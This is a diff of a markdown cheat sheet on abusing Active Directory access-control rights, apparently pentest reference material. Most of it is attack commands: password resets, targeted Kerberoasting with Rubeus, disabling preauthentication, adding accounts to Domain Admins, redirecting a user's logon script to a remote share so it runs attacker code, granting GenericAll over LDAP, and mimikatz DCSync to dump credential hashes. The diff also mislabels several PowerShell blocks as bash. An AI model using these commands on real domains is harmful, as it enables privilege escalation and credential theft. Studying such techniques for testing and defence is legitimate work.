@@ -12,30 +12,30 @@ One common ACL abuse technique is known as "over-permissioning." This occurs whe
 ## GenericAll / GenericWrite / WriteProperty
 
 ### On a User
-- **Change Password**
+1. **Change Password**
     ```bash
     net user <username> <password> /domain
     ```
-- **Targeted Kerberoasting**
-    - Set a fake Service Principal Name (SPN):
+2. **Targeted Kerberoasting**
+    1. Set a fake Service Principal Name (SPN):
         ```powershell
         Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
         ```
-    - Obtain the hash:
+    2. Obtain the hash:
         ```powershell
         .\Rubeus.exe kerberoast /user:<username> /nowrap
         ```
-    - Clear the SPN:
+    3. Clear the SPN:
         ```powershell
         Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
         ```
-- **Disable Preauthentication**
+3. **Disable Preauthentication**
     ```powershell
     Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
     ```
 
 ### On a Group
-- **Add to Group**
+1. **Add to Group**
     - Using `net`:
         ```bash
         net group "domain admins" spotless/add /domain
@@ -56,10 +56,9 @@ One common ACL abuse technique is known as "over-permissioning." This occurs whe
 
 1. GenericWrite on User
 - Overwrite logon script path for the target user:
-```powershell
+```bash
 Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
 ```
-
 2. AllExtendedRights
 
 - Change Password
@@ -67,46 +66,39 @@ Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\
 net user <username> <password> /domain
 ```
 - Add to Group
-   - Using `net`: 
-	```bash
-	net group "domain admins" spotless/add /domain
-	```
-	- Using Active Directory module:
-	```powershell
-	Add-ADGroupMember -Identity "domain admins" -Members spotless
-	```
-    - Using PowerView module:
-	```powershell
-	Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
-	```
+```bash
+net group "domain admins" spotless/add /domain
+Add-ADGroupMember -Identity "domain admins" -Members spotless
+Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
+```
 3. Self-Membership
 - Add to Group
-```powershell
+```bash
 Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
 ```
 4. ExtendedRight on
 - User-Force-Change-Password (Password Reset)
-```powershell
+```bash
 Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 Set-DomainUserPassword -Identity delegate -Verbose
 ```
 5. WriteProperty
 - Add to Group
-```powershell
+```bash
 Add-ADGroupMember -Identity MachineAdmins -Members $otherDomainUser
 ```
 6. WriteOwner
 - Change the object’s owner
-```powershell
+```bash
 Set-DomainObjectOwner -Identity testuser -Domain techcorp.local -OwnerIdentity "us\studentuser19"
 ```
 - Change Owner
-```powershell
+```bash
 Get-ADObject -Identity "CN=Users,DC=contoso,DC=com" -Properties Owner | Select-Object -ExpandProperty Owner
 ```
 7. WriteDACL
 - Grant Generic Permissions** (must be the owner)
-```powershell
+```bash
 $ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local" 
 $IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
 $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
@@ -115,7 +107,7 @@ $ADSI.psbase.commitchanges()
 ```
 8. DCSync Attack 
 - The user running the command must have Replicating Directory Changes permissions in Active Directory. This is typically assigned to domain admins or equivalent privileged accounts.
-```powershell
+```bash
 lsadump::dcsync /domain:<Domain> /user:<User>
 lsadump::dcsync /domain:example.com /user:administrator
 ```
